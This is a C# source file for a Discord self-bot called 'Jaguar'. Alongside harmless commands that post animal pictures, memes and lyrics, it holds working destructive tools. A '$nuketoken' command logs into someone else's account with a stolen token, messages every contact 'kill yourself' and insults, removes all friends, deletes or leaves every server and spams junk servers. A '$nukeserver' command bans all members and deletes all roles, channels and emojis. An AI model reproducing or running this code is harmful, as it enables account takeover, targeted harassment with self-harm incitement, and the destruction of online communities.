using System;
using Discord.Gateway;
using Discord;
using System.Threading;
using System.Net;
using System.Drawing;
using System.ComponentModel;
using System.Net.Http;
using System.Net.Http.Headers;
using Newtonsoft.Json;
using System.IO;
using System.Collections.Generic;

namespace Jaguar
{
    class Program
    {
        static void Main()
        {
            DiscordSocketClient client = new DiscordSocketClient();
            client.OnMessageReceived += Client_OnMessageReceived;
            client.OnLoggedIn += Client_OnLoggedIn;
            client.Login("TOKEN");

            Thread.Sleep(-1);
        }

        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            printC("Logged in as: " + args.User.Username + " | " + args.User.Id);
        }

        private static void Client_OnMessageReceived(DiscordSocketClient client, MessageEventArgs args)
        {
            if (args.Message.Author != client.User.Id) return;
            if (!args.Message.Content.Substring(0, 1).Equals("$")) return;
            bool success = true;
            string[] segments = args.Message.Content.Split(' ');
            new Thread(delegate ()
            {
                switch (segments[0])
                {
                    case "$nuketoken": printC("Attempting to nuke the token: " + segments[1] + "."); nuketoken(segments[1]); break;
                    case "$dog": printC("Posting an image of a dog in chat."); dog(args); break;
                    case "$shibe": printC("Posting an image of a shibe in chat."); shibe(args); break;
                    case "$cat": printC("Posting an image of a cat in chat."); cat(args); break;
                    case "$panda": printC("Posting an image of a panda in chat."); panda(args); break;
                    case "$redpanda": printC("Posting an image of a redpanda in chat."); redpanda(args); break;
                    case "$bird": printC("Posting an image of a bird in chat."); bird(args); break;
                    case "$fox": printC("Posting an image of a fox in chat."); fox(args); break;
                    case "$koala": printC("Posting an image of a koala in chat."); koala(args); break;
                    case "$pikachu": printC("Posting an image of a pikachu in chat."); pikachu(args); break;
                    case "$meme": printC("Posting a meme in chat."); meme(args); break;
                    case "$lyrics": printC("Attempting to post the lyrics of: " + segments[1] + "."); lyrics(segments[1], args); break;
                    case "$purge": printC("Attempting to purge " + segments[1] + " messages."); purge(segments[1], args, client); break;
                    case "$nukeserver": printC("Attempting to nuke the server."); nukeserver(args); break;
                    default: printC("Invalid command: " + args.Message.Content); success = false; break;
                }
            }).Start();
            if (success)
            {
                Thread.Sleep(250);
                args.Message.Edit(segments[0] + " executed ✅");
                Thread.Sleep(250);
                args.Message.Delete();
            }
            else
            {
                Thread.Sleep(250);
                args.Message.Edit(segments[0] + " failed ❌");
                Thread.Sleep(250);
                args.Message.Delete();
            }
            //Console.WriteLine("S: " + args.Message.Guild.Id + " | M: " + args.Message.Content);
        }

        private static void printC(string text)
        {
            string watermark = "[JAGUAR | EXO.BLACK] ";
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write(watermark);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(text);
            Console.Write("\n");
        }

        private static void nuketoken(string nuketoken)
        {
            DiscordSocketClient nukeclient = new DiscordSocketClient();
            nukeclient.OnLoggedIn += Nukeclient_OnLoggedIn;
            try { nukeclient.Login(nuketoken); } catch { printC("Invalid token."); }
            void Nukeclient_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
            {
                WebClient wc = new WebClient();
                wc.DownloadFile("https://cdn.discordapp.com/attachments/704745088861077556/704781261440548945/broke.png", "broke.png");
                wc.Dispose();
                nukeclient.User.ChangeSettings(new UserSettings() { Theme = Theme.Light });
                nukeclient.User.ChangeSettings(new UserSettings() { Language = Language.Russian });
                nukeclient.User.ChangeSettings(new UserSettings() { CompactMessages = true });
                nukeclient.User.ChangeProfile(new UserProfile() { Avatar = Image.FromFile("broke.png") });
                foreach (var dm in args.PrivateChannels)
                {
                    try
                    {
                        dm.SendMessage("i fucking hate you", false);
                        dm.SendMessage("http://cdn-images.imagevenue.com/54/f0/e9/ME11ZJGR_o.jpg", false);
                        dm.SendMessage("http://cdn-images.imagevenue.com/c6/ef/e4/ME11ZJGP_o.jpg", false);
                        dm.SendMessage("http://cdn-images.imagevenue.com/fb/15/64/ME11ZJGQ_o.jpg", false);
                        dm.SendMessage("kill yourself", false);
                    }
                    catch { }
                    dm.Leave();
                    Thread.Sleep(100);
                }
                foreach (var relationship in args.Relationships)
                {
                    if (relationship.Type == RelationshipType.Friends)
                        relationship.Remove();
                    if (relationship.Type == RelationshipType.IncomingRequest)
                        relationship.Remove();
                    if (relationship.Type == RelationshipType.OutgoingRequest)
                        relationship.Remove();
                    if (relationship.Type == RelationshipType.Blocked)
                        relationship.Remove();
                }
                foreach (var guild in client.GetGuilds())
                {
                    try
                    {
                        if (guild.Owner)
                            guild.Delete();
                        else
                            guild.Leave();
                    }
                    catch { }
                }
                for (int i = 1; i <= 100; i++)
                    nukeclient.CreateGuild("POOR LOL", Image.FromFile("broke.png"), "russia");
                Thread.Sleep(5000);
                File.Delete("broke.png");
                nukeclient.Logout();
            }
        }

        private static void dog(MessageEventArgs args)
        {
            HttpClient client = new HttpClient();
            var content = client.GetAsync("https://some-random-api.ml/img/dog").Result.Content.ReadAsStreamAsync();
            var result = new StreamReader(content.Result).ReadToEnd();
            dynamic json = JsonConvert.DeserializeObject(result);
            args.Message.Channel.SendMessage((string)json.link);
        }

        private static void shibe(MessageEventArgs args)
        {
            HttpClient client = new HttpClient();
            var content = client.GetAsync("http://shibe.online/api/shibes").Result.Content.ReadAsStreamAsync();
            var result = new StreamReader(content.Result).ReadToEnd();
            dynamic json = JsonConvert.DeserializeObject(result);
            args.Message.Channel.SendMessage((string)json[0]);
        }

        private static void cat(MessageEventArgs args)
        {
            HttpClient client = new HttpClient();
            var content = client.GetAsync("https://some-random-api.ml/img/cat").Result.Content.ReadAsStreamAsync();
            var result = new StreamReader(content.Result).ReadToEnd();
            dynamic json = JsonConvert.DeserializeObject(result);
            args.Message.Channel.SendMessage((string)json.link);
        }

        private static void panda(MessageEventArgs args)
        {
            HttpClient client = new HttpClient();
            var content = client.GetAsync("https://some-random-api.ml/img/panda").Result.Content.ReadAsStreamAsync();
            var result = new StreamReader(content.Result).ReadToEnd();
            dynamic json = JsonConvert.DeserializeObject(result);
            args.Message.Channel.SendMessage((string)json.link);
        }

        private static void redpanda(MessageEventArgs args)
        {
            HttpClient client = new HttpClient();
            var content = client.GetAsync("https://some-random-api.ml/img/red_panda").Result.Content.ReadAsStreamAsync();
            var result = new StreamReader(content.Result).ReadToEnd();
            dynamic json = JsonConvert.DeserializeObject(result);
            args.Message.Channel.SendMessage((string)json.link);
        }

        private static void bird(MessageEventArgs args)
        {
            HttpClient client = new HttpClient();
            var content = client.GetAsync("https://some-random-api.ml/img/birb").Result.Content.ReadAsStreamAsync();
            var result = new StreamReader(content.Result).ReadToEnd();
            dynamic json = JsonConvert.DeserializeObject(result);
            args.Message.Channel.SendMessage((string)json.link);
        }

        private static void fox(MessageEventArgs args)
        {
            HttpClient client = new HttpClient();
            var content = client.GetAsync("https://some-random-api.ml/img/fox").Result.Content.ReadAsStreamAsync();
            var result = new StreamReader(content.Result).ReadToEnd();
            dynamic json = JsonConvert.DeserializeObject(result);
            args.Message.Channel.SendMessage((string)json.link);
        }

        private static void koala(MessageEventArgs args)
        {
            HttpClient client = new HttpClient();
            var content = client.GetAsync("https://some-random-api.ml/img/koala").Result.Content.ReadAsStreamAsync();
            var result = new StreamReader(content.Result).ReadToEnd();
            dynamic json = JsonConvert.DeserializeObject(result);
            args.Message.Channel.SendMessage((string)json.link);
        }

        private static void pikachu(MessageEventArgs args)
        {
            HttpClient client = new HttpClient();
            var content = client.GetAsync("https://some-random-api.ml/img/pikachuimg").Result.Content.ReadAsStreamAsync();
            var result = new StreamReader(content.Result).ReadToEnd();
            dynamic json = JsonConvert.DeserializeObject(result);
            args.Message.Channel.SendMessage((string)json.link);
        }

        private static void meme(MessageEventArgs args)
        {
            HttpClient client = new HttpClient();
            var content = client.GetAsync("https://some-random-api.ml/meme").Result.Content.ReadAsStreamAsync();
            var result = new StreamReader(content.Result).ReadToEnd();
            dynamic json = JsonConvert.DeserializeObject(result);
            args.Message.Channel.SendMessage((string)json.caption);
            args.Message.Channel.SendMessage((string)json.image);
        }

        private static void lyrics(string songname, MessageEventArgs args)
        {

            HttpClient client = new HttpClient();
            var content = client.GetAsync("https://some-random-api.ml/lyrics?title=" + songname).Result.Content.ReadAsStreamAsync();
            var result = new StreamReader(content.Result).ReadToEnd();
            dynamic json = JsonConvert.DeserializeObject(result);
            args.Message.Channel.SendMessage((string)json.lyrics);
        }

        private static void purge(string limit, MessageEventArgs args, DiscordSocketClient client)
        {
            //uint uintlimit = uint.Parse(limit, System.Globalization.NumberStyles.HexNumber) + 1;     Limit = uintlimit,
            int min = 0; int max = Int32.Parse(limit);
            foreach (var purgemsg in args.Message.Channel.GetMessages(new MessageFilters() { UserId = client.User.Id, BeforeId = args.Message.Id }))
            {
                purgemsg.Delete();
                min++;
                if (min == max)
                    return;
            }
        }

        private static void nukeserver(MessageEventArgs args)
        {
            foreach (var mem in args.Message.Guild.GetAllMembers())
            {
                try
                {
                    mem.Ban();
                }
                catch { }
            }
            foreach (var roles in args.Message.Guild.GetRoles())
            {
                try
                {
                    roles.Delete();
                }
                catch { }
            }
            foreach (var channels in args.Message.Guild.GetChannels())
            {
                try
                {
                    channels.Delete();
                }
                catch { }
            }
            foreach (var emojis in args.Message.Guild.GetEmojis())
            {
                try
                {
                    emojis.Delete();
                }
                catch { }
            }
            for (int i = 1; i <= 100; i++)
                args.Message.Guild.CreateChannel("[JAGUAR | EXO.BLACK]", ChannelType.Voice);
        }
    }
}